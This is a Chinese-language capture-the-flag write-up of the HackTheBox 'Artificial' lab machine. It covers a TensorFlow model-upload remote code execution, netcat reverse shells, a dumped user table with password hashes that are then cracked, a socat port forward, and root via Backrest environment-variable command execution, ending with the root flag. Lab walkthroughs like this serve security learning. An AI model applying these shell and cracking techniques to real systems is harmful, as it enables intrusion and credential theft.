{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Artificial","contentHtml":"<h1>Season8 - Artificial</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Artificial\">https://app.hackthebox.com/machines/Artificial</a> | <code>Linux</code> | <code>Easy</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  Artificial nmap -sT -min-rate 5000 -p- 10.10.11.74 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 11:35 CST\nWarning: 10.10.11.74 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.74\nHost is up (0.045s latency).\nNot shown: 41844 closed tcp ports (conn-refused), 23689 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 79.44 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Artificial nmap -sT -A -p 22,80 10.10.11.74       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 11:40 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> artificial.htb (10.10.11.74)\nHost is up (0.25s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)\n|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)\n|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:<span class=\"hljs-built_in\">fc</span> (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Artificial - AI Solutions\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   782.28 ms 10.10.16.1\n2   783.23 ms artificial.htb (10.10.11.74)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 31.72 seconds\n</code></pre>\n<p>访问 <code>HTTP</code> ，采集指纹</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image1.png\" alt=\"image.png\"></p>\n<p>主页中还有一段关于训练模型的代码：</p>\n<pre><code class=\"hljs language-bash\">import numpy as np\nimport pandas as pd\nimport tensorflow as tf\nfrom tensorflow import keras\nfrom tensorflow.keras import layers\n\nnp.random.seed(42)\n\n<span class=\"hljs-comment\"># Create hourly data for a week</span>\nhours = np.arange(0, 24 * 7)\nprofits = np.random.rand(len(hours)) * 100\n\n<span class=\"hljs-comment\"># Create a DataFrame</span>\ndata = pd.DataFrame({\n    <span class=\"hljs-string\">'hour'</span>: hours,\n    <span class=\"hljs-string\">'profit'</span>: profits\n})\n\nX = data[<span class=\"hljs-string\">'hour'</span>].values.reshape(-1, 1)\ny = data[<span class=\"hljs-string\">'profit'</span>].values\n\n<span class=\"hljs-comment\"># Build the model</span>\nmodel = keras.Sequential([\n    layers.Dense(64, activation=<span class=\"hljs-string\">'relu'</span>, input_shape=(1,)),\n    layers.Dense(64, activation=<span class=\"hljs-string\">'relu'</span>),\n    layers.Dense(1)\n])\n\n<span class=\"hljs-comment\"># Compile the model</span>\nmodel.compile(optimizer=<span class=\"hljs-string\">'adam'</span>, loss=<span class=\"hljs-string\">'mean_squared_error'</span>)\n\n<span class=\"hljs-comment\"># Train the model</span>\nmodel.fit(X, y, epochs=100, verbose=1)\n\n<span class=\"hljs-comment\"># Save the model</span>\nmodel.save(<span class=\"hljs-string\">'profits_model.h5'</span>)\n</code></pre>\n<p>可以创建账户，创建<code>sunset</code>用户</p>\n<p>进入到后台有一个文件上传功能点</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image2.png\" alt=\"image.png\"></p>\n<p>我们使用主页上面的代码生成<code>h5</code>文件后上传，点击 <code>View Predictions</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image3.png\" alt=\"image.png\"></p>\n<h2>tensorflow-rce</h2>\n<p>这里使用项目中的<code>payload</code>：<a href=\"https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py\">tensorflow-rce/exploit.py at main · Splinter0/tensorflow-rce</a></p>\n<p>尝试了很久都无法弹<code>shell</code> ，所以直接构建靶机中提供的<code>Dockerfile</code></p>\n<pre><code class=\"hljs language-bash\">➜  ~ docker build ./ \n => => writing image sha256:0354df82e2aa9dc1a9273186494362df152ac3d9b4d6ef2600f9d8b743909af1 \n➜  ~ docker images\nREPOSITORY   TAG       IMAGE ID       CREATED              SIZE\n&#x3C;none>       &#x3C;none>    0354df82e2aa   About a minute ago   1.46GB\ntomcat       latest    88b0f1cee84c   3 months ago         519MB\n\n➜  ~ docker run -it -v $(<span class=\"hljs-built_in\">pwd</span>):/tmp/1 0354df82e2aa\n\nroot@9e00e60448cc:/code# <span class=\"hljs-built_in\">cd</span> /tmp/1\nroot@9e00e60448cc:/tmp/1# python 1.py\n2025-06-28 05:54:50.388941: I tensorflow/core/util/port.cc:110] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, <span class=\"hljs-built_in\">set</span> the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.\n2025-06-28 05:54:50.448436: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions <span class=\"hljs-keyword\">in</span> performance-critical operations.\nTo <span class=\"hljs-built_in\">enable</span> the following instructions: AVX2 AVX_VNNI FMA, <span class=\"hljs-keyword\">in</span> other operations, rebuild TensorFlow with the appropriate compiler flags.\nsh: 1: nc: not found\n/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save(<span class=\"hljs-string\">'my_model.keras'</span>)`.\n  saving_api.save_model(\n</code></pre>\n<p>然后将生成的<code>exploit5</code> 上传，然后点击<code>View Predictions</code></p>\n<p>就能将 <code>shell</code> 弹回来了</p>\n<pre><code class=\"hljs language-bash\">➜  Artificial nc -lvp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.16.7] from artificial.htb [10.10.11.74] 54280\n/bin/sh: 0: can<span class=\"hljs-string\">'t access tty; job control turned off\n$ \n</span></code></pre>\n<h2>SQLite &#x26; Crack</h2>\n<p>查看<code>App.py</code> ，能找到<code>users.db</code></p>\n<pre><code class=\"hljs language-arduino\">app.secret_key = <span class=\"hljs-string\">\"Sup3rS3cr3tKey4rtIfici4L\"</span>\n\napp.config[<span class=\"hljs-string\">'SQLALCHEMY_DATABASE_URI'</span>] = <span class=\"hljs-string\">'sqlite:///users.db'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">app@artificial:/$ find / -name <span class=\"hljs-string\">'users.db'</span> 2>/dev/null\n/home/app/app/instance/users.db\n</code></pre>\n<p>将其下载下来到<code>Kali</code></p>\n<p>读取用户表</p>\n<pre><code class=\"hljs language-bash\">sqlite> <span class=\"hljs-keyword\">select</span> * from user;\n1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8\n2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb\n3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36\n4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6\n5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0\n6|40UR|40UR@gmail.com|32311c320e01f55dfd36defb087ff344\n7|aa|a@a|4124bc0a9335c27f086f24ba207a4912\n8|pranay|pranay@gmail.com|51c28bd171d43e6148f6188d9b07de6c\n9|1|1@ya.ru|c4ca4238a0b923820dcc509a6f75849b\n10|admin|admin@artificial.htb|21232f297a57a5a743894a0e4a801fc3\n11|test2@|<span class=\"hljs-built_in\">test</span>@mail.com|098f6bcd4621d373cade4e832627b4f6\n12|ZAP|zaproxy@example.com|903a98d709fa4683aaaa036b84c125a6\n13|<span class=\"hljs-built_in\">test</span>|<span class=\"hljs-built_in\">test</span>@test.com|202cb962ac59075b964b07152d234b70\n14|testtest|test2@mail.com|05a671c66aefea124cc08b76ea6d30bb\n15|test10|test10@test.com|5f4dcc3b5aa765d61d8327deb882cf99\n16|sunset|sunset@q.com|30f80affc3322427a482878e75e4cdfc\n17|test123|test123@mail.com|5f4dcc3b5aa765d61d8327deb882cf99\n18|gus|gus@gmail.com|84a26c4612a7f9958174ee6552625282\n19|admin5|admin5@qq.com|e10adc3949ba59abbe56e057f20f883e\n20|notuser|notuser@test.com|3a117c7e3ebc3f8c215428873a6a19c4\n</code></pre>\n<p>我们再看一眼靶机的家目录都有哪几个用户</p>\n<pre><code class=\"hljs language-bash\">app@artificial:/$ <span class=\"hljs-built_in\">ls</span> /home\napp  gael\n</code></pre>\n<p>所以我们直接将<code>gael</code>的那条数据进行破解</p>\n<pre><code class=\"hljs language-bash\">➜  Artificial hash-identifier\n   <span class=\"hljs-comment\">#########################################################################</span>\n   <span class=\"hljs-comment\">#     __  __                     __           ______    _____           #</span>\n   <span class=\"hljs-comment\">#    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #</span>\n   <span class=\"hljs-comment\">#    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #</span>\n   <span class=\"hljs-comment\">#     \\ \\  _  \\  /'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #</span>\n   <span class=\"hljs-comment\">#      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #</span>\n   <span class=\"hljs-comment\">#       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #</span>\n   <span class=\"hljs-comment\">#        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #</span>\n   <span class=\"hljs-comment\">#                                                             By Zion3R #</span>\n   <span class=\"hljs-comment\">#                                                    www.Blackploit.com #</span>\n   <span class=\"hljs-comment\">#                                                   Root@Blackploit.com #</span>\n   <span class=\"hljs-comment\">#########################################################################</span>\n--------------------------------------------------\n HASH: c99175974b6e192936d97224638a34f8\n\nPossible Hashs:\n[+] MD5\n[+] Domain Cached Credentials - MD4(MD4((<span class=\"hljs-variable\">$pass</span>)).(strtolower(<span class=\"hljs-variable\">$username</span>)))\n</code></pre>\n<p>在线网站即可拿到密码 <code>mattp005numbertwo</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image4.png\" alt=\"image.png\"></p>\n<p>使用该密码进行登录</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image5.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<h3>Recon</h3>\n<p>查看是否存在仅在本地开放的端口</p>\n<pre><code class=\"hljs language-bash\">gael@artificial:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                    Local Address:Port                                     Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                         127.0.0.53%lo:53                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       2048                                          127.0.0.1:5000                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                          127.0.0.1:9898                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                             0.0.0.0:80                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                      127.0.0.53%lo:53                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                             0.0.0.0:22                                            0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                                [::]:80                                               [::]:*                                              \ntcp                    LISTEN                  0                       128                                                [::]:22                                               [::]:*\n</code></pre>\n<p>我们将<code>9898</code>使用<code>socat</code>转发出去</p>\n<pre><code class=\"hljs language-bash\">gael@artificial:/tmp$ ./socat TCP-LISTEN:9899,fork tcp4:127.0.0.1:9898 &#x26;\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image6.png\" alt=\"image.png\"></p>\n<blockquote>\n<p>Backrest 是建立在 restic 之上的 Web 可访问备份解决方案。Backrest 提供了一个 WebUI，它包装了 restic CLI，使创建存储库、浏览快照和恢复文件变得容易。此外，Backrest 可以在后台运行，并采取一种有主见的方法来安排快照和编排存储库运行状况作。</p>\n</blockquote>\n<p>但是需要凭据才能进行登录</p>\n<p><code>config.json</code> 需要<code>root</code>权限</p>\n<pre><code class=\"hljs language-bash\">gael@artificial:/opt/backrest/.config/backrest$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 24\ndrwxr-xr-x 2 root root 4096 Jun 28 06:43 .\ndrwxr-xr-x 3 root root 4096 Mar  3 21:27 ..\n-rw------- 1 root root 1626 Jun 28 06:43 config.json\n-rw------- 1 root root  280 Jun 28 06:41 config.json.bak.2025-06-28-06-41-12\n-rw------- 1 root root  850 Jun 28 06:43 config.json.bak.2025-06-28-06-43-17\n-rw------- 1 root root 1087 Jun 28 06:43 config.json.bak.2025-06-28-06-43-39\n</code></pre>\n<p>最后在<code>/var/baskups</code>中能找到<code>backrest_backup.tar.gz</code></p>\n<pre><code class=\"hljs language-bash\">gael@artificial:/var/backups$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 51972\ndrwxr-xr-x  2 root root       4096 Jun 28 06:25 .\ndrwxr-xr-x 13 root root       4096 Jun  2 07:38 ..\n-rw-r--r--  1 root root      51200 Jun 28 06:25 alternatives.tar.0\n-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0\n-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz\n-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz\n-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz\n-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz\n-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz\n-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz\n-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz\n-rw-r--r--  1 root root        268 Sep  5  2024 dpkg.diversions.0\n-rw-r--r--  1 root root        135 Sep 14  2024 dpkg.statoverride.0\n-rw-r--r--  1 root root     696841 Jun  9 10:48 dpkg.status.0\n</code></pre>\n<pre><code class=\"hljs language-bash\">gael@artificial:/var/backups$ <span class=\"hljs-built_in\">id</span>\nuid=1000(gael) gid=1000(gael) <span class=\"hljs-built_in\">groups</span>=1000(gael),1007(sysadm)\n</code></pre>\n<p>我们将其下载到<code>kali</code> ，解压后就可以访问到备份的<code>backrest/.config/backrest/config.json</code></p>\n<pre><code class=\"hljs language-bash\">➜  backrest <span class=\"hljs-built_in\">cat</span> config.json  \n{\n  <span class=\"hljs-string\">\"modno\"</span>: 2,\n  <span class=\"hljs-string\">\"version\"</span>: 4,\n  <span class=\"hljs-string\">\"instance\"</span>: <span class=\"hljs-string\">\"Artificial\"</span>,\n  <span class=\"hljs-string\">\"auth\"</span>: {\n    <span class=\"hljs-string\">\"disabled\"</span>: <span class=\"hljs-literal\">false</span>,\n    <span class=\"hljs-string\">\"users\"</span>: [\n      {\n        <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"backrest_root\"</span>,\n        <span class=\"hljs-string\">\"passwordBcrypt\"</span>: <span class=\"hljs-string\">\"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP\"</span>\n      }\n    ]\n  }\n}\n</code></pre>\n<p>对其进行<code>base64</code>解码</p>\n<pre><code class=\"hljs language-bash\">➜  backrest <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP\"</span> | <span class=\"hljs-built_in\">base64</span> -d\n$2a$10<span class=\"hljs-variable\">$cVGIy9VMXQd0gM5ginCmjei2kZR</span>/ACMMkSsspbRutYP58EBZz/0QO# \n</code></pre>\n<p>再进行破解</p>\n<pre><code class=\"hljs language-bash\">➜  Artificial john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>                     \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n!@#$%^           (?)     \n1g 0:00:00:37 DONE (2025-06-28 15:16) 0.02643g/s 142.7p/s 142.7c/s 142.7C/s lightbulb..huevos\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>最后得到密码：<code>!@#$%^</code></p>\n<p>使用凭据成功进入后台</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image7.png\" alt=\"image.png\"></p>\n<p>因为服务是通过 <code>root</code>权限运行的，我们可以设置存储库到<code>root</code>的家目录中，BackrestWiki：<a href=\"https://garethgeorge.github.io/backrest/introduction/getting-started\">https://garethgeorge.github.io/backrest/introduction/getting-started</a></p>\n<p>添加存储库时，我们可以存储库文档</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image8.png\" alt=\"image.png\"></p>\n<p>并且可以通过环境变量进行命令执行</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image9.png\" alt=\"image.png\"></p>\n<p>设置环境变量</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image10.png\" alt=\"image.png\"></p>\n<p>我们点击 “<code>submit</code>”时就能将<code>Root shell</code>弹过来</p>\n<pre><code class=\"hljs language-bash\">➜  Artificial nc -lvp 1234                \nlistening on [any] 1234 ...\nconnect to [10.10.16.7] from artificial.htb [10.10.11.74] 57440\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (142145): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nroot@artificial:/# \n</code></pre>\n<pre><code class=\"hljs language-bash\">root@artificial:~# <span class=\"hljs-built_in\">cat</span> root.txt\n<span class=\"hljs-built_in\">cat</span> root.txt\n9e4004a41e01a3f1170e16adc14db0d9\n</code></pre>\n<h2>总结</h2>\n<p>两周都在弄期末作业，没时间打，最后一天才上来打。偏偏刚好还得了急性肠胃炎，肚子一直滚，脑子里冰火两重天，相似。</p>","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","updated":"2025-06-28","tags":["HackTheBox","Linux","tensorflow","Backrest","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Artificial\n\n https://app.hackthebox.com/machines/Artificial | `Linux` | `Easy`\n \n\n\n\nRecon\n\n\n\n\n\n访问 `HTTP` ，采集指纹\n\n\n\n主页中还有一段关于训练模型的代码：\n\n\n\n可以创建账户，创建`sunset`用户\n\n进入到后台有一个文件上传功能点\n\n\n\n我们使用主页上面的代码生成`h...","isEncrypted":true},"recentPosts":[{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"}]},"__N_SSG":true}